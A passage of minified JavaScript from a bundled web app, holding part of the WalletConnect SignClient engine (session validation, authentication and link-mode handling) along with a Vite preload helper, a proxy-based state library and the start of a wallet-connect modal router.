this.sendError({id:i,topic:n,error:o}),this.client.logger.error(o)}}),F(this,"onSessionAuthenticateResponse",(n,r)=>{const{id:i}=r;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:n,payload:r}),qt(r)?this.events.emit(oe("session_request",i),{result:r.result}):vt(r)&&this.events.emit(oe("session_request",i),{error:r.error})}),F(this,"onSessionAuthenticateRequest",async n=>{var r;const{topic:i,payload:s,attestation:o,encryptedId:a,transportType:c}=n;try{const{requester:l,authPayload:u,expiryTimestamp:h}=s.params,f=await this.getVerifyContext({attestationId:o,hash:bt(JSON.stringify(s)),encryptedId:a,metadata:l.metadata,transportType:c}),p={requester:l,pairingTopic:i,id:s.id,authPayload:u,verifyContext:f,expiryTimestamp:h};await this.setAuthRequest(s.id,{request:p,pairingTopic:i,transportType:c}),c===he.link_mode&&(r=l.metadata.redirect)!=null&&r.universal&&this.client.core.addLinkModeSupportedApp(l.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:i,params:s.params,id:s.id,verifyContext:f})}catch(l){this.client.logger.error(l);const u=s.params.requester.publicKey,h=await this.client.core.crypto.generateKeyPair(),f=this.getAppLinkIfEnabled(s.params.requester.metadata,c),p={type:an,receiverPublicKey:u,senderPublicKey:h};await this.sendError({id:s.id,topic:i,error:l,encodeOpts:p,rpcOpts:Be.wc_sessionAuthenticate.autoReject,appLink:f})}}),F(this,"addSessionRequestToSessionRequestQueue",n=>{this.sessionRequestQueue.queue.push(n)}),F(this,"cleanupAfterResponse",n=>{this.deletePendingSessionRequest(n.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=Ut.idle,this.processSessionRequestQueue()},z.toMiliseconds(this.requestQueueDelay))}),F(this,"cleanupPendingSentRequestsForTopic",({topic:n,error:r})=>{const i=this.client.core.history.pending;i.length>0&&i.filter(s=>s.topic===n&&s.request.method==="wc_sessionRequest").forEach(s=>{this.events.emit(oe("session_request",s.request.id),{error:r})})}),F(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===Ut.active){this.client.logger.info("session request queue is already active.");return}const n=this.sessionRequestQueue.queue[0];if(!n){this.client.logger.info("session request queue is empty.");return}try{this.emitSessionRequest(n)}catch(r){this.client.logger.error(r)}}),F(this,"emitSessionRequest",n=>{if(this.emittedSessionRequests.has(n.id)){this.client.logger.warn({id:n.id},`Skipping emitting \`session_request\` event for duplicate request. id: ${n.id}`);return}this.sessionRequestQueue.state=Ut.active,this.emittedSessionRequests.add(n.id),this.client.events.emit("session_request",n)}),F(this,"onPairingCreated",n=>{if(n.methods&&this.expectedPairingMethodMap.set(n.topic,n.methods),n.active)return;const r=this.client.proposal.getAll().find(i=>i.pairingTopic===n.topic);r&&this.onSessionProposeRequest({topic:n.topic,payload:rn("wc_sessionPropose",Re(ie({},r),{requiredNamespaces:r.requiredNamespaces,optionalNamespaces:r.optionalNamespaces,relays:r.relays,proposer:r.proposer,sessionProperties:r.sessionProperties,scopedProperties:r.scopedProperties}),r.id),attestation:r.attestation,encryptedId:r.encryptedId})}),F(this,"isValidConnect",async n=>{if(!Qe(n)){const{message:l}=V("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(n)}`);throw new Error(l)}const{pairingTopic:r,requiredNamespaces:i,optionalNamespaces:s,sessionProperties:o,scopedProperties:a,relays:c}=n;if($e(r)||await this.isValidPairingTopic(r),!B8(c)){const{message:l}=V("MISSING_OR_INVALID",`connect() relays: ${c}`);throw new Error(l)}if(i&&!$e(i)&&Oi(i)!==0){const l="requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";["fatal","error","silent"].includes(this.client.logger.level)?console.warn(l):this.client.logger.warn(l),this.validateNamespaces(i,"requiredNamespaces")}if(s&&!$e(s)&&Oi(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),o&&!$e(o)&&this.validateSessionProps(o,"sessionProperties"),a&&!$e(a)){this.validateSessionProps(a,"scopedProperties");const l=Object.keys(i||{}).concat(Object.keys(s||{}));if(!Object.keys(a).every(u=>l.includes(u.split(":")[0])))throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: ${JSON.stringify(l)}`)}}),F(this,"validateNamespaces",(n,r)=>{const i=T8(n,"connect()",r);if(i)throw new Error(i.message)}),F(this,"isValidApprove",async n=>{if(!Qe(n))throw new Error(V("MISSING_OR_INVALID",`approve() params: ${n}`).message);const{id:r,namespaces:i,relayProtocol:s,sessionProperties:o,scopedProperties:a}=n;this.checkRecentlyDeleted(r),await this.isValidProposalId(r);const c=this.client.proposal.get(r),l=sa(i,"approve()");if(l)throw new Error(l.message);const u=Uh(c.requiredNamespaces,i,"approve()");if(u)throw new Error(u.message);if(!be(s,!0)){const{message:h}=V("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(h)}if(o&&!$e(o)&&this.validateSessionProps(o,"sessionProperties"),a&&!$e(a)){this.validateSessionProps(a,"scopedProperties");const h=new Set(Object.keys(i));if(!Object.keys(a).every(f=>h.has(f.split(":")[0])))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(h).join(", ")}`)}}),F(this,"isValidReject",async n=>{if(!Qe(n)){const{message:s}=V("MISSING_OR_INVALID",`reject() params: ${n}`);throw new Error(s)}const{id:r,reason:i}=n;if(this.checkRecentlyDeleted(r),await this.isValidProposalId(r),!k8(i)){const{message:s}=V("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(i)}`);throw new Error(s)}}),F(this,"isValidSessionSettleRequest",n=>{if(!Qe(n)){const{message:l}=V("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${n}`);throw new Error(l)}const{relay:r,controller:i,namespaces:s,expiry:o}=n;if(!Dg(r)){const{message:l}=V("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(l)}const a=D8(i,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=sa(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(vn(o)){const{message:l}=V("EXPIRED","onSessionSettleRequest()");throw new Error(l)}}),F(this,"isValidUpdate",async n=>{if(!Qe(n)){const{message:c}=V("MISSING_OR_INVALID",`update() params: ${n}`);throw new Error(c)}const{topic:r,namespaces:i}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r);const s=this.client.session.get(r),o=sa(i,"update()");if(o)throw new Error(o.message);const a=Uh(s.requiredNamespaces,i,"update()");if(a)throw new Error(a.message)}),F(this,"isValidExtend",async n=>{if(!Qe(n)){const{message:i}=V("MISSING_OR_INVALID",`extend() params: ${n}`);throw new Error(i)}const{topic:r}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r)}),F(this,"isValidRequest",async n=>{if(!Qe(n)){const{message:c}=V("MISSING_OR_INVALID",`request() params: ${n}`);throw new Error(c)}const{topic:r,request:i,chainId:s,expiry:o}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r);const{namespaces:a}=this.client.session.get(r);if(!Nh(a,s)){const{message:c}=V("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!N8(i)){const{message:c}=V("MISSING_OR_INVALID",`request() ${JSON.stringify(i)}`);throw new Error(c)}if(!L8(a,s,i.method)){const{message:c}=V("MISSING_OR_INVALID",`request() method: ${i.method}`);throw new Error(c)}this.validateRequestExpiry(o)}),F(this,"isValidRespond",async n=>{var r;if(!Qe(n)){const{message:a}=V("MISSING_OR_INVALID",`respond() params: ${n}`);throw new Error(a)}const{topic:i,response:s}=n;try{await this.isValidSessionTopic(i)}catch(a){throw(r=n?.response)!=null&&r.id&&this.cleanupAfterResponse(n),a}if(!U8(s)){const{message:a}=V("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(a)}const o=this.client.pendingRequest.get(s.id);if(o.topic!==i){const{message:a}=V("MISMATCHED_TOPIC",`Request response topic mismatch. reqId: ${s.id}, expected topic: ${o.topic}, received topic: ${i}`);throw new Error(a)}}),F(this,"isValidPing",async n=>{if(!Qe(n)){const{message:i}=V("MISSING_OR_INVALID",`ping() params: ${n}`);throw new Error(i)}const{topic:r}=n;await this.isValidSessionOrPairingTopic(r)}),F(this,"isValidEmit",async n=>{if(!Qe(n)){const{message:a}=V("MISSING_OR_INVALID",`emit() params: ${n}`);throw new Error(a)}const{topic:r,event:i,chainId:s}=n;await this.isValidSessionTopic(r);const{namespaces:o}=this.client.session.get(r);if(!Nh(o,s)){const{message:a}=V("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!M8(i)){const{message:a}=V("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}if(!F8(o,s,i.name)){const{message:a}=V("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}}),F(this,"isValidDisconnect",async n=>{if(!Qe(n)){const{message:i}=V("MISSING_OR_INVALID",`disconnect() params: ${n}`);throw new Error(i)}const{topic:r}=n;await this.isValidSessionOrPairingTopic(r)}),F(this,"isValidAuthenticate",n=>{const{chains:r,uri:i,domain:s,nonce:o}=n;if(!Array.isArray(r)||r.length===0)throw new Error("chains is required and must be a non-empty array");if(!be(i,!1))throw new Error("uri is required parameter");if(!be(s,!1))throw new Error("domain is required parameter");if(!be(o,!1))throw new Error("nonce is required parameter");if([...new Set(r.map(c=>fs(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=fs(r[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),F(this,"getVerifyContext",async n=>{const{attestationId:r,hash:i,encryptedId:s,metadata:o,transportType:a}=n,c={verified:{verifyUrl:o.verifyUrl||mi,validation:"UNKNOWN",origin:o.url||""}};try{if(a===he.link_mode){const u=this.getAppLinkIfEnabled(o,a);return c.verified.validation=u&&new URL(u).origin===new URL(o.url).origin?"VALID":"INVALID",c}const l=await this.client.core.verify.resolve({attestationId:r,hash:i,encryptedId:s,verifyUrl:o.verifyUrl});l&&(c.verified.origin=l.origin,c.verified.isScam=l.isScam,c.verified.validation=l.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(l){this.client.logger.warn(l)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c}),F(this,"validateSessionProps",(n,r)=>{Object.values(n).forEach((i,s)=>{if(i==null){const{message:o}=V("MISSING_OR_INVALID",`${r} must contain an existing value for each key. Received: ${i} for key ${Object.keys(n)[s]}`);throw new Error(o)}})}),F(this,"getPendingAuthRequest",n=>{const r=this.client.auth.requests.get(n);return typeof r=="object"?r:void 0}),F(this,"addToRecentlyDeleted",(n,r)=>{if(this.recentlyDeletedMap.set(n,r),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let i=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(i++>=s)break;this.recentlyDeletedMap.delete(o)}}}),F(this,"checkRecentlyDeleted",n=>{const r=this.recentlyDeletedMap.get(n);if(r){const{message:i}=V("MISSING_OR_INVALID",`Record was recently deleted - ${r}: ${n}`);throw new Error(i)}}),F(this,"isLinkModeEnabled",(n,r)=>{var i,s,o,a,c,l,u,h,f;return!n||r!==he.link_mode?!1:((s=(i=this.client.metadata)==null?void 0:i.redirect)==null?void 0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((l=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:l.universal)!==""&&((u=n?.redirect)==null?void 0:u.universal)!==void 0&&((h=n?.redirect)==null?void 0:h.universal)!==""&&((f=n?.redirect)==null?void 0:f.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(n.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"}),F(this,"getAppLinkIfEnabled",(n,r)=>{var i;return this.isLinkModeEnabled(n,r)?(i=n?.redirect)==null?void 0:i.universal:void 0}),F(this,"handleLinkModeMessage",({url:n})=>{if(!n||!n.includes("wc_ev")||!n.includes("topic"))return;const r=Gu(n,"topic")||"",i=decodeURIComponent(Gu(n,"wc_ev")||""),s=this.client.session.keys.includes(r);s&&this.client.session.update(r,{transportType:he.link_mode}),this.client.core.dispatchEnvelope({topic:r,message:i,sessionExists:s})}),F(this,"registerLinkModeListeners",async()=>{var n;if(jc()||Bn()&&(n=this.client.metadata.redirect)!=null&&n.linkMode){const r=global==null?void 0:global.Linking;if(typeof r<"u"){r.addEventListener("url",this.handleLinkModeMessage,this.client.name);const i=await r.getInitialURL();i&&setTimeout(()=>{this.handleLinkModeMessage({url:i})},50)}}}),F(this,"getTVFApproveParams",n=>{try{const r=_g(n.namespaces),i=f8(n.namespaces),s=d8(n.namespaces),o=n.sessionProperties,a=n.scopedProperties;return{approvedChains:r,approvedMethods:i,approvedEvents:s,sessionProperties:o,scopedProperties:a}}catch(r){return this.client.logger.warn(r,"Error getting TVF approve params"),{}}}),F(this,"getTVFParams",(n,r,i)=>{var s,o,a;if(!((s=r.request)!=null&&s.method))return{};const c={correlationId:n,rpcMethods:[r.request.method],chainId:r.chainId};try{const l=this.extractTxHashesFromResult(r.request,i);c.txHashes=l,c.contractAddresses=this.isValidContractData(r.request.params)?[(a=(o=r.request.params)==null?void 0:o[0])==null?void 0:a.to]:[]}catch(l){this.client.logger.warn(l,"Error getting TVF params")}return c}),F(this,"isValidContractData",n=>{var r;if(!n)return!1;try{const i=n?.data||((r=n?.[0])==null?void 0:r.data);if(!i.startsWith("0x"))return!1;const s=i.slice(2);return/^[0-9a-fA-F]*$/.test(s)?s.length%2===0:!1}catch{}return!1}),F(this,"extractTxHashesFromResult",(n,r)=>{var i;try{if(!r)return[];const s=n.method,o=UO[s];if(s==="sui_signTransaction")return[t_(r.transactionBytes)];if(s==="near_signTransaction")return[nh(r)];if(s==="near_signTransactions")return r.map(c=>nh(c));if(s==="xrpl_signTransactionFor"||s==="xrpl_signTransaction")return[(i=r.tx_json)==null?void 0:i.hash];if(s==="polkadot_signTransaction")return[iS({transaction:n.params.transactionPayload,signature:r.signature})];if(s==="algo_signTxn")return Mr(r)?r.map(c=>rh(c)):[rh(r)];if(s==="cosmos_signDirect")return[r_(r)];if(s==="wallet_sendCalls")return i_(r);if(typeof r=="string")return[r];const a=r[o.key];if(Mr(a))return s==="solana_signAllTransactions"?a.map(c=>e_(c)):a;if(typeof a=="string")return[a]}catch(s){this.client.logger.warn(s,"Error extracting tx hashes from result")}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,n=this.client.core.relayer.messages.getWithoutAck(e);for(const[r,i]of Object.entries(n))for(const s of i)try{await this.onProviderMessageEvent({topic:r,message:s,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${r}, message: ${s}`)}}catch(e){this.client.logger.warn(e,"processPendingMessageEvents failed")}}isInitialized(){if(!this.initialized){const{message:e}=V("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(we.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:n,message:r,attestation:i,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(ys)?this.client.auth.authKeys.get(ys):{publicKey:void 0};try{const a=await this.client.core.crypto.decode(n,r,{receiverPublicKey:o,encoding:s===he.link_mode?An:nt});el(a)?(this.client.core.history.set(n,a),await this.onRelayEventRequest({topic:n,payload:a,attestation:i,transportType:s,encryptedId:bt(r)})):oo(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:n,payload:a,transportType:s}),this.client.core.history.delete(n,a.id)):(this.client.logger.error(`onRelayMessage() -> unknown payload: ${JSON.stringify(a)}`),await this.onRelayEventUnknownPayload({topic:n,payload:a,transportType:s})),await this.client.core.relayer.messages.ack(n,r)}catch(a){this.client.logger.error(`onRelayMessage() -> failed to process an inbound message: ${r}`),this.client.logger.error(a)}}registerExpirerEvents(){this.client.core.expirer.on(mt.expired,async e=>{const{topic:n,id:r}=Ip(e.target);if(r&&this.client.pendingRequest.keys.includes(r))return await this.deletePendingSessionRequest(r,V("EXPIRED"),!0);if(r&&this.client.auth.requests.keys.includes(r))return await this.deletePendingAuthRequest(r,V("EXPIRED"),!0);n?this.client.session.keys.includes(n)&&(await this.deleteSession({topic:n,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:n})):r&&(await this.deleteProposal(r,!0),this.client.events.emit("proposal_expire",{id:r}))})}registerPairingEvents(){this.client.core.pairing.events.on(Kn.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(Kn.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!be(e,!1)){const{message:n}=V("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(n)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:n}=V("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(n)}if(vn(this.client.core.pairing.pairings.get(e).expiry)){const{message:n}=V("EXPIRED",`pairing topic: ${e}`);throw new Error(n)}}async isValidSessionTopic(e){if(!be(e,!1)){const{message:n}=V("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(n)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:n}=V("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(n)}if(vn(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:n}=V("EXPIRED",`session topic: ${e}`);throw new Error(n)}if(!this.client.core.crypto.keychain.has(e)){const{message:n}=V("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(n)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(be(e,!1)){const{message:n}=V("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(n)}else{const{message:n}=V("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(n)}}async isValidProposalId(e){if(!R8(e)){const{message:n}=V("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(n)}if(!this.client.proposal.keys.includes(e)){const{message:n}=V("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(n)}if(vn(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:n}=V("EXPIRED",`proposal id: ${e}`);throw new Error(n)}}validateRequestExpiry(e){if(e&&!z8(e,fa)){const{message:n}=V("MISSING_OR_INVALID",`request() expiry: ${e}. Expiry must be a number (in seconds) between ${fa.min} and ${fa.max}`);throw new Error(n)}}}class XO extends hr{constructor(e,n){super(e,n,RO,nl),this.core=e,this.logger=n}}class JO extends hr{constructor(e,n){super(e,n,kO,nl),this.core=e,this.logger=n}}class QO extends hr{constructor(e,n){super(e,n,MO,nl,r=>r.id),this.core=e,this.logger=n}}class e4 extends hr{constructor(e,n){super(e,n,qO,co,()=>ys),this.core=e,this.logger=n}}class t4 extends hr{constructor(e,n){super(e,n,zO,co),this.core=e,this.logger=n}}class n4 extends hr{constructor(e,n){super(e,n,VO,co,r=>r.id),this.core=e,this.logger=n}}var r4=Object.defineProperty,i4=(t,e,n)=>e in t?r4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,da=(t,e,n)=>i4(t,typeof e!="symbol"?e+"":e,n);class s4{constructor(e,n){this.core=e,this.logger=n,da(this,"authKeys"),da(this,"pairingTopics"),da(this,"requests"),this.authKeys=new e4(this.core,this.logger),this.pairingTopics=new t4(this.core,this.logger),this.requests=new n4(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}}var o4=Object.defineProperty,a4=(t,e,n)=>e in t?o4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Q=(t,e,n)=>a4(t,typeof e!="symbol"?e+"":e,n);class rl extends km{constructor(e){super(e),Q(this,"protocol",Gg),Q(this,"version",Yg),Q(this,"name",ha.name),Q(this,"metadata"),Q(this,"core"),Q(this,"logger"),Q(this,"events",new Tt.EventEmitter),Q(this,"engine"),Q(this,"session"),Q(this,"proposal"),Q(this,"pendingRequest"),Q(this,"auth"),Q(this,"signConfig"),Q(this,"on",(r,i)=>this.events.on(r,i)),Q(this,"once",(r,i)=>this.events.once(r,i)),Q(this,"off",(r,i)=>this.events.off(r,i)),Q(this,"removeListener",(r,i)=>this.events.removeListener(r,i)),Q(this,"removeAllListeners",r=>this.events.removeAllListeners(r)),Q(this,"connect",async r=>{try{return await this.engine.connect(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"pair",async r=>{try{return await this.engine.pair(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"approve",async r=>{try{return await this.engine.approve(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"reject",async r=>{try{return await this.engine.reject(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"update",async r=>{try{return await this.engine.update(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"extend",async r=>{try{return await this.engine.extend(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"request",async r=>{try{return await this.engine.request(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"respond",async r=>{try{return await this.engine.respond(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"ping",async r=>{try{return await this.engine.ping(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"emit",async r=>{try{return await this.engine.emit(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"disconnect",async r=>{try{return await this.engine.disconnect(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"find",r=>{try{return this.engine.find(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(r){throw this.logger.error(r.message),r}}),Q(this,"authenticate",async(r,i)=>{try{return await this.engine.authenticate(r,i)}catch(s){throw this.logger.error(s.message),s}}),Q(this,"formatAuthMessage",r=>{try{return this.engine.formatAuthMessage(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"approveSessionAuthenticate",async r=>{try{return await this.engine.approveSessionAuthenticate(r)}catch(i){throw this.logger.error(i.message),i}}),Q(this,"rejectSessionAuthenticate",async r=>{try{return await this.engine.rejectSessionAuthenticate(r)}catch(i){throw this.logger.error(i.message),i}}),this.name=e?.name||ha.name,this.metadata=Hx(e?.metadata),this.signConfig=e?.signConfig;const n=Ag({logger:e?.logger||ha.logger,name:this.name});this.logger=n,this.core=e?.core||new BO(e),this.session=new JO(this.core,this.logger),this.proposal=new XO(this.core,this.logger),this.pendingRequest=new QO(this.core,this.logger),this.engine=new ZO(this),this.auth=new s4(this.core,this.logger)}static async init(e){const n=new rl(e);return await n.initialize(),n}get context(){return ot(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success")}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}}const c4="modulepreload",l4=function(t){return"/"+t},Ef={},u4=function(e,n,r){let i=Promise.resolve();if(n&&n.length>0){let c=function(l){return Promise.all(l.map(u=>Promise.resolve(u).then(h=>({status:"fulfilled",value:h}),h=>({status:"rejected",reason:h}))))};document.getElementsByTagName("link");const o=document.querySelector("meta[property=csp-nonce]"),a=o?.nonce||o?.getAttribute("nonce");i=c(n.map(l=>{if(l=l4(l),l in Ef)return;Ef[l]=!0;const u=l.endsWith(".css"),h=u?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${l}"]${h}`))return;const f=document.createElement("link");if(f.rel=u?"stylesheet":c4,u||(f.as="script"),f.crossOrigin="",f.href=l,a&&f.setAttribute("nonce",a),document.head.appendChild(f),u)return new Promise((p,d)=>{f.addEventListener("load",p),f.addEventListener("error",()=>d(new Error(`Unable to preload CSS for ${l}`)))})}))}function s(o){const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=o,window.dispatchEvent(a),!a.defaultPrevented)throw o}return i.then(o=>{for(const a of o||[])a.status==="rejected"&&s(a.reason);return e().catch(s)})},h4=Symbol(),xf=Object.getPrototypeOf,dc=new WeakMap,f4=t=>t&&(dc.has(t)?dc.get(t):xf(t)===Object.prototype||xf(t)===Array.prototype),d4=t=>f4(t)&&t[h4]||null,_f=(t,e=!0)=>{dc.set(t,e)},Fs={},pa=t=>typeof t=="object"&&t!==null,In=new WeakMap,os=new WeakSet,p4=(t=Object.is,e=(l,u)=>new Proxy(l,u),n=l=>pa(l)&&!os.has(l)&&(Array.isArray(l)||!(Symbol.iterator in l))&&!(l instanceof WeakMap)&&!(l instanceof WeakSet)&&!(l instanceof Error)&&!(l instanceof Number)&&!(l instanceof Date)&&!(l instanceof String)&&!(l instanceof RegExp)&&!(l instanceof ArrayBuffer),r=l=>{switch(l.status){case"fulfilled":return l.value;case"rejected":throw l.reason;default:throw l}},i=new WeakMap,s=(l,u,h=r)=>{const f=i.get(l);if(f?.[0]===u)return f[1];const p=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l));return _f(p,!0),i.set(l,[u,p]),Reflect.ownKeys(l).forEach(d=>{if(Object.getOwnPropertyDescriptor(p,d))return;const g=Reflect.get(l,d),w={value:g,enumerable:!0,configurable:!0};if(os.has(g))_f(g,!1);else if(g instanceof Promise)delete w.value,w.get=()=>h(g);else if(In.has(g)){const[_,C]=In.get(g);w.value=s(_,C(),h)}Object.defineProperty(p,d,w)}),Object.preventExtensions(p)},o=new WeakMap,a=[1,1],c=l=>{if(!pa(l))throw new Error("object required");const u=o.get(l);if(u)return u;let h=a[0];const f=new Set,p=($,N=++a[0])=>{h!==N&&(h=N,f.forEach(E=>E($,N)))};let d=a[1];const g=($=++a[1])=>(d!==$&&!f.size&&(d=$,_.forEach(([N])=>{const E=N[1]($);E>h&&(h=E)})),h),w=$=>(N,E)=>{const S=[...N];S[1]=[$,...S[1]],p(S,E)},_=new Map,C=($,N)=>{if((Fs?"production":void 0)!=="production"&&_.has($))throw new Error("prop listener already exists");if(f.size){const E=N[3](w($));_.set($,[N,E])}else _.set($,[N])},v=$=>{var N;const E=_.get($);E&&(_.delete($),(N=E[1])==null||N.call(E))},b=$=>(f.add($),f.size===1&&_.forEach(([E,S],D)=>{if((Fs?"production":void 0)!=="production"&&S)throw new Error("remove already exists");const P=E[3](w(D));_.set(D,[E,P])}),()=>{f.delete($),f.size===0&&_.forEach(([E,S],D)=>{S&&(S(),_.set(D,[E]))})}),x=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l)),B=e(x,{deleteProperty($,N){const E=Reflect.get($,N);v(N);const S=Reflect.deleteProperty($,N);return S&&p(["delete",[N],E]),S},set($,N,E,S){const D=Reflect.has($,N),P=Reflect.get($,N,S);if(D&&(t(P,E)||o.has(E)&&t(P,o.get(E))))return!0;v(N),pa(E)&&(E=d4(E)||E);let y=E;if(E instanceof Promise)E.then(m=>{E.status="fulfilled",E.value=m,p(["resolve",[N],m])}).catch(m=>{E.status="rejected",E.reason=m,p(["reject",[N],m])});else{!In.has(E)&&n(E)&&(y=c(E));const m=!os.has(y)&&In.get(y);m&&C(N,m)}return Reflect.set($,N,y,S),p(["set",[N],E,P]),!0}});o.set(l,B);const k=[x,g,s,b];return In.set(B,k),Reflect.ownKeys(l).forEach($=>{const N=Object.getOwnPropertyDescriptor(l,$);"value"in N&&(B[$]=l[$],delete N.value,delete N.writable),Object.defineProperty(x,$,N)}),B})=>[c,In,os,t,e,n,r,i,s,o,a],[g4]=p4();function kn(t={}){return g4(t)}function fr(t,e,n){const r=In.get(t);(Fs?"production":void 0)!=="production"&&!r&&console.warn("Please use proxy object");let i;const s=[],o=r[3];let a=!1;const l=o(u=>{s.push(u),i||(i=Promise.resolve().then(()=>{i=void 0,a&&e(s.splice(0))}))});return a=!0,()=>{a=!1,l()}}function y4(t,e){const n=In.get(t);(Fs?"production":void 0)!=="production"&&!n&&console.warn("Please use proxy object");const[r,i,s]=n;return s(r,i(),e)}const Se=kn({history:["ConnectWallet"],view:"ConnectWallet",data:void 0}),Xg={state:Se,subscribe(t){return fr(Se,()=>t(Se))},push(t,e){t!==Se.view&&(Se.view=t,e&&(Se.data=e),Se.history.push(t))},reset(t){Se.view=t,Se.history=[t]},replace(t){Se.history.length>1&&(Se.history[Se.history.length-1]=t,Se.view=t)},goBack(){if(Se.history.length>1){Se.history.pop();const[t]=Se.history.slice(-1);Se.view=t}},setData(t){Se.data=t}},We={WALLETCONNECT_DEEPLINK_CHOICE:"WALLETCONNECT_DEEPLINK_CHOICE",WCM_VERSION:"WCM_VERSION",RECOMMENDED_WALLET_AMOUNT:9,isMobile(){return typeof window<"u"?!!(window.matchMedia("(pointer:coarse)").matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},isAndroid(){return We.isMobile()&&navigator.userAgent.toLowerCase().includes("android")},isIos(){const t=navigator.userAgent.toLowerCase();return We.isMobile()&&(t.includes("iphone")||t.includes("ipad"))},isHttpUrl(t){return t.startsWith("http://")||t.startsWith("https://")},isArray(t){return Array.isArray(t)&&t.length>0},isTelegram(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)},formatNativeUrl(t,e,n){if(We.isHttpUrl(t))return 